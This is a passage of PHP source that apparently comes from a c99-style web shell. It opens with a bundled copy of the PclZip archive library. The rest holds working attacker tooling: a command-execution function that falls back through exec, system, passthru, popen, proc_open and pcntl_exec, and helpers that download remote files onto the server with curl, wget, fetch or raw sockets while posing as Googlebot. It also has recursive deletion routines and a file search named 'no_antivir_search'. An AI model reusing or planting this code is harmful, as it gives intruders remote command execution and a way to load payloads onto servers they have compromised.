'PCLZIP_ERR_BAD_FORMAT', PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL', PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL', PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM', PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE', PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE', PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION' ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE' ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION' ); if (isset($v_name[$this->error_code])) { $v_value = $v_name[$this->error_code]; } else { $v_value = 'NoName'; } if ($p_with_code) { return($v_value.' ('.$this->error_code.')'); } else { return($v_value); } } function errorInfo($p_full=false) { if (PCLZIP_ERROR_EXTERNAL == 1) { return(PclErrorString()); } else { if ($p_full) { return($this->errorName(true)." : ".$this->error_string); } else { return($this->error_string." [code ".$this->error_code."]"); } } } function privCheckFormat($p_level=0) { $v_result = true; clearstatcache(); $this->privErrorReset(); if (!is_file($this->zipname)) { PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'"); return(false); } if (!is_readable($this->zipname)) { PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'"); return(false); } return $v_result; } function privOpenFd($p_mode) { $v_result=1; if ($this->zip_fd != 0) { PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open'); return PclZip::errorCode(); } if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0) { PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode'); return PclZip::errorCode(); } return $v_result; } function privCloseFd() { $v_result=1; if ($this->zip_fd != 0) @fclose($this->zip_fd); $this->zip_fd = 0; return $v_result; } function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options) { $v_result=1; $this->privDisableMagicQuotes(); 
if ( ($p_path == "") || ( (substr($p_path, 0, 1) != "/") && (substr($p_path, 0, 3) != "../") && (substr($p_path,1,2)!=":/") && (substr($p_path,1,2)!=":\\"))) $p_path = "./".$p_path; if (($p_path != "./") && ($p_path != "/")) { while (substr($p_path, -1) == "/") { $p_path = substr($p_path, 0, strlen($p_path)-1); } }if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/')) { $p_remove_path .= '/'; } $p_remove_path_size = strlen($p_remove_path); if (($v_result = $this->privOpenFd('rb')) != 1) { $this->privSwapBackMagicQuotes(); return $v_result; } $v_central_dir = array(); if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1) { $this->privCloseFd(); $this->privSwapBackMagicQuotes(); return $v_result; } $v_pos_entry = $v_central_dir['offset']; $j_start = 0; for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++) { @rewind($this->zip_fd); if (@fseek($this->zip_fd, $v_pos_entry)) { $this->privCloseFd(); $this->privSwapBackMagicQuotes(); PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size'); return PclZip::errorCode(); } $v_header = array(); if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1) { $this->privCloseFd(); $this->privSwapBackMagicQuotes(); return $v_result; } $v_header['index'] = $i; $v_pos_entry = ftell($this->zip_fd); $v_extract = true; if ( ($v_extract) && ( ($v_header['compression'] != 8) && ($v_header['compression'] != 0))) { $v_header['status'] = 'unsupported_compression'; if ( (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) { $this->privSwapBackMagicQuotes(); PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION, "Filename '".$v_header['stored_filename']."' is " ."compressed by an unsupported compression " ."method (".$v_header['compression'].") "); return PclZip::errorCode(); } } if (($v_extract) && (($v_header['flag'] & 1) == 1)) { $v_header['status'] = 'unsupported_encryption'; if ( (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) { $this->privSwapBackMagicQuotes(); PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, "Unsupported encryption for " ." filename '".$v_header['stored_filename'] ."'"); return PclZip::errorCode(); } } if (($v_extract) && ($v_header['status'] != 'ok')) { $v_result = 1; if ($v_result != 1) { $this->privCloseFd(); $this->privSwapBackMagicQuotes(); return $v_result; } $v_extract = false; } if ($v_extract) { @rewind($this->zip_fd); if (@fseek($this->zip_fd, $v_header['offset'])) { $this->privCloseFd(); $this->privSwapBackMagicQuotes(); PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size'); return PclZip::errorCode(); } $v_result1 = $this->privExtractFile($v_header, $p_path, $p_remove_path, $p_remove_all_path, $p_options); if ($v_result1 < 1) { $this->privCloseFd(); $this->privSwapBackMagicQuotes(); return $v_result1; } $v_result = 1; if ($v_result != 1) { $this->privCloseFd(); $this->privSwapBackMagicQuotes(); return $v_result; } if ($v_result1 == 2) { break; } } } $this->privCloseFd(); $this->privSwapBackMagicQuotes(); return $v_result; } function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options) { $v_result=1; if (($v_result = $this->privReadFileHeader($v_header)) != 1) { return $v_result; } if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) { } if ($p_path != '') { $p_entry['filename'] = $p_path."/".$p_entry['filename']; } if ($p_entry['status'] == 'ok') { if (file_exists($p_entry['filename'])) { if (is_dir($p_entry['filename'])) { $p_entry['status'] = "already_a_directory"; if ( (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) { PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY, "Filename '".$p_entry['filename']."' is " ."already used by an existing directory"); return PclZip::errorCode(); } } else if (!is_writeable($p_entry['filename'])) { $p_entry['status'] = "write_protected"; if ( (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) { PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, "Filename '".$p_entry['filename']."' exists " ."and is write protected"); return PclZip::errorCode(); } } else if (filemtime($p_entry['filename']) > $p_entry['mtime']) { if ( (isset($p_options[PCLZIP_OPT_REPLACE_NEWER])) && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) { } else { $p_entry['status'] = "newer_exist"; if ( (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) { PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, "Newer version of '".$p_entry['filename']."' exists " ."and option PCLZIP_OPT_REPLACE_NEWER is not selected"); return PclZip::errorCode(); } } } else { } } else { if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/')) $v_dir_to_check = $p_entry['filename']; else if (!strstr($p_entry['filename'], "/")) $v_dir_to_check = ""; else $v_dir_to_check = dirname($p_entry['filename']); if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) { $p_entry['status'] = "path_creation_fail"; $v_result = 1; } } } if ($p_entry['status'] == 'ok') { if (!(($p_entry['external']&0x00000010)==0x00000010)) { if ($p_entry['compression'] == 0) { if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) { $p_entry['status'] = "write_error"; return $v_result; } $v_size = $p_entry['compressed_size']; while ($v_size != 0) { $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE); $v_buffer = @fread($this->zip_fd, $v_read_size); @fwrite($v_dest_file, $v_buffer, $v_read_size); $v_size -= $v_read_size; } fclose($v_dest_file); touch($p_entry['filename'], $p_entry['mtime']); } else { if (($p_entry['flag'] & 1) == 1) { } else { $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']); } $v_file_content = @gzinflate($v_buffer); unset($v_buffer); if ($v_file_content === FALSE) { $p_entry['status'] = "error"; return $v_result; } if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) { $p_entry['status'] = "write_error"; return $v_result; } @fwrite($v_dest_file, $v_file_content, $p_entry['size']); unset($v_file_content); @fclose($v_dest_file); @touch($p_entry['filename'], $p_entry['mtime']); } if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) { @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]); } } } if ($p_entry['status'] == "aborted") { $p_entry['status'] = "skipped"; } return $v_result; } function privReadFileHeader(&$p_header) { $v_result=1; $v_binary_data = @fread($this->zip_fd, 4); $v_data = unpack('Vid', $v_binary_data); if ($v_data['id'] != 0x04034b50) { PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure'); return PclZip::errorCode(); } $v_binary_data = fread($this->zip_fd, 26); if (strlen($v_binary_data) != 26) { $p_header['filename'] = ""; $p_header['status'] = "invalid_header"; PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data)); return PclZip::errorCode(); } $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data); $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']); if ($v_data['extra_len'] != 0) { $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']); } else { $p_header['extra'] = ''; } $p_header['version_extracted'] = $v_data['version']; $p_header['compression'] = $v_data['compression']; $p_header['size'] = $v_data['size']; $p_header['compressed_size'] = $v_data['compressed_size']; $p_header['crc'] = $v_data['crc']; $p_header['flag'] = $v_data['flag']; $p_header['filename_len'] = $v_data['filename_len']; $p_header['mdate'] = $v_data['mdate']; $p_header['mtime'] = $v_data['mtime']; if ($p_header['mdate'] && $p_header['mtime']) { $v_hour = ($p_header['mtime'] & 0xF800) >> 11; $v_minute = ($p_header['mtime'] & 0x07E0) >> 5; $v_seconde = ($p_header['mtime'] & 0x001F)*2; $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980; $v_month = ($p_header['mdate'] & 0x01E0) >> 5; $v_day = $p_header['mdate'] & 0x001F; $p_header['mtime'] = mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year); } else { $p_header['mtime'] = time(); } $p_header['stored_filename'] = $p_header['filename']; $p_header['status'] = "ok"; return $v_result; } function privReadCentralFileHeader(&$p_header) { $v_result=1; $v_binary_data = @fread($this->zip_fd, 4); $v_data = unpack('Vid', $v_binary_data); if ($v_data['id'] != 0x02014b50) { PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure'); return PclZip::errorCode(); } $v_binary_data = fread($this->zip_fd, 42); if (strlen($v_binary_data) != 42) { $p_header['filename'] = ""; $p_header['status'] = "invalid_header"; PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data)); return PclZip::errorCode(); } $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data); if ($p_header['filename_len'] != 0) $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']); else $p_header['filename'] = ''; if ($p_header['extra_len'] != 0) $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']); else $p_header['extra'] = ''; if ($p_header['comment_len'] != 0) $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']); else $p_header['comment'] = ''; if (1) { $v_hour = ($p_header['mtime'] & 0xF800) >> 11; $v_minute = ($p_header['mtime'] & 0x07E0) >> 5; $v_seconde = ($p_header['mtime'] & 0x001F)*2; $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980; $v_month = ($p_header['mdate'] & 0x01E0) >> 5; $v_day = $p_header['mdate'] & 0x001F; $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year); } else { $p_header['mtime'] = time(); } $p_header['stored_filename'] = $p_header['filename']; $p_header['status'] = 'ok'; if (substr($p_header['filename'], -1) == '/') { $p_header['external'] = 0x00000010; } return $v_result; } function privCheckFileHeaders(&$p_local_header, &$p_central_header) { $v_result=1; if ($p_local_header['filename'] != $p_central_header['filename']) { } if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) { } if ($p_local_header['flag'] != $p_central_header['flag']) { } if ($p_local_header['compression'] != $p_central_header['compression']) { } if ($p_local_header['mtime'] != $p_central_header['mtime']) { } if ($p_local_header['filename_len'] != $p_central_header['filename_len']) { } if (($p_local_header['flag'] & 8) == 8) { $p_local_header['size'] = $p_central_header['size']; $p_local_header['compressed_size'] = $p_central_header['compressed_size']; $p_local_header['crc'] = $p_central_header['crc']; } return $v_result; } function privReadEndCentralDir(&$p_central_dir) { $v_result=1; $v_size = filesize($this->zipname); @fseek($this->zip_fd, $v_size); if (@ftell($this->zip_fd) != $v_size) { PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\''); return PclZip::errorCode(); } $v_found = 0; if ($v_size > 26) { @fseek($this->zip_fd, $v_size-22); if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22)) { PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\''); return PclZip::errorCode(); } $v_binary_data = @fread($this->zip_fd, 4); $v_data = @unpack('Vid', $v_binary_data); if ($v_data['id'] == 0x06054b50) { $v_found = 1; } $v_pos = ftell($this->zip_fd); } if (!$v_found) { $v_maximum_size = 65557; if ($v_maximum_size > $v_size) $v_maximum_size = $v_size; @fseek($this->zip_fd, $v_size-$v_maximum_size); if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size)) { PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\''); return PclZip::errorCode(); } $v_pos = ftell($this->zip_fd); $v_bytes = 0x00000000; while ($v_pos < $v_size) { $v_byte = @fread($this->zip_fd, 1); $v_bytes = ($v_bytes << 8) | Ord($v_byte); if ($v_bytes == 0x504b0506) { $v_pos++; break; } $v_pos++; } if ($v_pos == $v_size) { PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature"); return PclZip::errorCode(); } } $v_binary_data = fread($this->zip_fd, 18); if (strlen($v_binary_data) != 18) { PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data)); return PclZip::errorCode(); } $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data); if (($v_pos + $v_data['comment_size'] + 18) != $v_size) { if (0) { PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'The central dir is not at the end of the archive.' .' Some trailing bytes exists after the archive.'); return PclZip::errorCode(); } } if ($v_data['comment_size'] != 0) { $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']); } else $p_central_dir['comment'] = ''; $p_central_dir['entries'] = $v_data['entries']; $p_central_dir['disk_entries'] = $v_data['disk_entries']; $p_central_dir['offset'] = $v_data['offset']; $p_central_dir['size'] = $v_data['size']; $p_central_dir['disk'] = $v_data['disk']; $p_central_dir['disk_start'] = $v_data['disk_start']; return $v_result; } function privDirCheck($p_dir, $p_is_dir=false) { $v_result = 1; if (($p_is_dir) && (substr($p_dir, -1)=='/')) { $p_dir = substr($p_dir, 0, strlen($p_dir)-1); } if ((is_dir($p_dir)) || ($p_dir == "")) { return 1; } $p_parent_dir = dirname($p_dir); if ($p_parent_dir != $p_dir) { if ($p_parent_dir != "") { if (($v_result = $this->privDirCheck($p_parent_dir)) != 1) { return $v_result; } } } if (!@mkdir($p_dir, 0777)) { PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'"); return PclZip::errorCode(); } return $v_result; } function privErrorLog($p_error_code=0, $p_error_string='') { if (PCLZIP_ERROR_EXTERNAL == 1) { PclError($p_error_code, $p_error_string); } else { $this->error_code = $p_error_code; $this->error_string = $p_error_string; } } function privErrorReset() { if (PCLZIP_ERROR_EXTERNAL == 1) { PclErrorReset(); } else { $this->error_code = 0; $this->error_string = ''; } } function privDisableMagicQuotes() { $v_result=1; if ( (!function_exists("get_magic_quotes_runtime")) || (!function_exists("set_magic_quotes_runtime"))) { return $v_result; } if ($this->magic_quotes_status != -1) { return $v_result; } $this->magic_quotes_status = @get_magic_quotes_runtime(); if ($this->magic_quotes_status == 1) { @set_magic_quotes_runtime(0); } return $v_result; } function privSwapBackMagicQuotes() { $v_result=1; if ( (!function_exists("get_magic_quotes_runtime")) || (!function_exists("set_magic_quotes_runtime"))) { return $v_result; } if ($this->magic_quotes_status != -1) { return $v_result; } if ($this->magic_quotes_status == 1) { @set_magic_quotes_runtime($this->magic_quotes_status); } return $v_result; } }



function system_curl_upload($url, $filepath) {
	$test = myshellexec('echo \'huak\'');
	if (false === strpos($test, 'huak')) {
		return 'no exec';
	}
	$locate = myshellexec('which curl');
	if (!$locate) {
		return 'not find curl';
	}
	$upload = myshellexec($locate.' '.$url.' -o '.$filepath);
	if (file_exists($filepath) && filesize($filepath) != 0) {
		return true;
	} else {
		return 'not upload';
	}
}


function fetch_upload($url, $filepath) {
	$test = myshellexec('echo \'huak\'');
	if (false === strpos($test, 'huak')) {
		return 'no exec';
	}
	$locate = myshellexec('which fetch');
	if (!$locate) {
		return 'not find fetch';
	}
	$upload = myshellexec($locate.' -p '.$url.' -o '.$filepath);
	if (file_exists($filepath) && filesize($filepath) != 0) {
		return true;
	} else {
		return 'not upload';
	}
}


function wget_upload($url, $filepath) {
	$test = myshellexec('echo \'huak\'');
	if (false === strpos($test, 'huak')) {
		return 'no exec';
	}
	$locate = myshellexec('which wget');
	if (!$locate) {
		return 'not find wget';
	}
	$upload = myshellexec($locate.' '.$url.' -O '.$filepath);
	if (file_exists($filepath) && filesize($filepath) != 0) {
		return true;
	} else {
		return 'not upload';
	}
}

function fsockopen_upload($url, $filepath) {
	global $disablefunc;
	if (!function_exists('fsockopen')) {
		return 'fsockopen not exists';
	}
	if (in_array('fsockopen', $disablefunc)) {
		return 'fsockopen is are disable function';
	}
	$file = @fopen($filepath, 'w');
	if (!$file) {
		return 'file '.$filepath.' not create';
	}
	$bits = @parse_url($url);
	if (!$bits) {
		return 'invalid url ('.$url.')';
	}

	$path = isset($bits['path']) ? $bits['path'] : '/';

	if (isset($bits['query']) && !empty($bits['query'])) {
		$path .= '?'.$bits['query'];
	}
	$sock = @fsockopen($bits['host'], 80, $errnum, $errstr, 60);
	if(!$sock) {
		return '('.$errnum.') '.$errstr;
	}
	fwrite($sock, 'GET '.$path.' HTTP/1.0'."\r\n");
	fwrite($sock, 'Host: '.$bits['host']."\r\n");
	fwrite($sock, 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'."\r\n");
	fwrite($sock, 'Accept: */*'."\r\n");
	fwrite($sock, 'Accept-Language: en'."\r\n");
	fwrite($sock, "\r\n");

	$content = false;
	$line    = '';
	while (!feof($sock)) {
		$line .= fgets($sock);
		if (!$content && false !== strpos($line, "\r\n\r\n")) {
			$line    = '';
			$content = true;
		} elseif ($content) {
			fwrite($file, $line);
			$line = '';
		}
	}
	fclose($sock);
	fclose($file);
	return true;
}


function php_curl_upload($url, $filepath) {
	global $disablefunc;
	if (!function_exists('curl_init')) {
		return 'curl not exists';
	}
	if (in_array('curl_init', $disablefunc)) {
		return 'curl_init is are disable function';
	}
	$file = @fopen($filepath, 'w');
	if (!$file) {
		return 'file '.$filepath.' not create';
	}
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_TIMEOUT, 300);
	curl_setopt($curl, CURLOPT_HEADER, 0);
	curl_setopt($curl, CURLE_OPERATION_TIMEOUTED, 300);
	curl_setopt($curl, CURLOPT_FILE, $file);
	$lucky = curl_exec($curl);
	fclose($file);
	if (!$lucky) {
		$errorMsg = curl_error($curl);
		$errorNumber = curl_errno($curl);
		curl_close($curl);
		return '('.$errorNumber.') '.$errorMsg;
	} else {
		return true;
	}
}


function listdir($start_dir='.') {
  $files = array();
  if (is_dir($start_dir)) {
    $fh = opendir($start_dir);
    while (($file = readdir($fh)) !== false) {
      # loop through the files, skipping . and .., and recursing if necessary
      if (strcmp($file, '.')==0 || strcmp($file, '..')==0) continue;
      $filepath = $start_dir . '/' . $file;
      if ( is_dir($filepath) )
        $files = array_merge($files, listdir($filepath));
      else
        array_push($files, $filepath);
    }
    closedir($fh);
  } else {
    # false if the function was called with an invalid non-directory argument
    $files = false;
  }
 return $files;
}
function view_size($size)
{
 if (!is_numeric($size)) {return FALSE;}
 else
 {
  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
  else {$size = $size . " B";}
  return $size;
 }
}

function fs_rmdir($d)
{
 $h = opendir($d);
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.$o)) {unlink($d.$o);}
   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}

function fs_rmobj($o)
{
 $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
 if (is_dir($o))
 {
  if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return FALSE;}
}



function myshellexec($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(@function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(@function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(@function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fread($f,1024); }
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fgets($f,1024); }
   }
   @pclose($f);
  }
  elseif(@is_resource($f = @proc_open($cfe,array(1 => array("pipe", "w")),$pipes)))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fread($pipes[1], 1024);}
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fgets($pipes[1], 1024);}
   }
   @proc_close($f);
  }
  elseif(@function_exists('pcntl_exec')&&@function_exists('pcntl_fork'))
   {
    $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
    $pid = @pcntl_fork();
    if ($pid == -1) {
     $res .= '[-] Could not children fork. c99shexit';
    } else if ($pid) {
         if (@pcntl_wifexited($status)){$res .= '[+] Done! Command "'.$cfe.'" successfully executed.';}
         else {$res .= '[-] Error. Command incorrect.';}
    } else {
         $cfe = array(" -e 'system(\"$cfe\")'");
         if(@pcntl_exec('/usr/bin/perl',$cfe)) c99shexit(0);
         if(@pcntl_exec('/usr/local/bin/perl',$cfe)) c99shexit(0);
         die();
    }
   }
 }
 return $res;
}


function tabsort($a,$b) 
{
	global $v; 
	return strnatcmp($a[$v], $b[$v]);
}

function view_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}

 $owner["read"] = ($mode & 00400)?"r":"-";
 $owner["write"] = ($mode & 00200)?"w":"-";
 $owner["execute"] = ($mode & 00100)?"x":"-";
 $group["read"] = ($mode & 00040)?"r":"-";
 $group["write"] = ($mode & 00020)?"w":"-";
 $group["execute"] = ($mode & 00010)?"x":"-";
 $world["read"] = ($mode & 00004)?"r":"-";
 $world["write"] = ($mode & 00002)? "w":"-";
 $world["execute"] = ($mode & 00001)?"x":"-";

 if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
 if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
 if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}

 return $type.join("",$owner).join("",$group).join("",$world);
}

if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}
if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}
if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}
if (!function_exists("parse_perms"))
{
function parse_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$t = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
 else {$t = "?";}
 $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;
 $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;
 $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;
 return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
}
}

function parsesort($sort)
{
 $one = intval($sort);
 $second = substr($sort,-1);
 if ($second != "d") {$second = "a";}
 return array($one,$second);
}

function view_perms_color($o)
{
 if (!@is_readable($o)) {return "<font color=red>".view_perms(@fileperms($o))."</font>";}
 elseif (!@is_writable($o)) {return "<font color=white>".view_perms(@fileperms($o))."</font>";}
 else {return "<font color=green>".view_perms(@fileperms($o))."</font>";}
}



function no_antivir_search($d)
{
 global $found;
 global $found_d;
 global $found_f;
 global $search_i_f;
 global $search_i_d;
 global $a;
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($f = readdir($h)) !== FALSE)
 {
  if($f != "." && $f != "..")
  {
   $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));
   if (is_dir($d.$f))
   {
    $search_i_d++;
    if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
    if (!is_link($d.$f)) {no_antivir_search($d.$f);}
   }
   else
   {
    $search_i_f++;
    if ($bool)
    {
     if (!empty($a["text"]))
     {
      $r = @file_get_contents($d.$f);
      if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
      if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
      if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
      else {$bool = strpos(" ".$r,$a["text"],1);}
      if ($a["text_not"]) {$bool = !$bool;}
      if ($bool) {$found[] = $d.$f; $found_f++;}
     }
     else {$found[] = $d.$f; $found_f++;}
    }
   }
  }
 }
 closedir($h);
}
if(!isset($act)) {$act='';}
if ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$ft ='edit'; $act = "f"; $d = dirname($f); $f = basename($f);}}

header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", FALSE);
header("Pragma: no-cache");
if (empty($tmpdir))
{
 $tmpdir = ini_get("upload_tmp_dir");
 if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
}
$tmpdir = realpath($tmpdir);
$tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
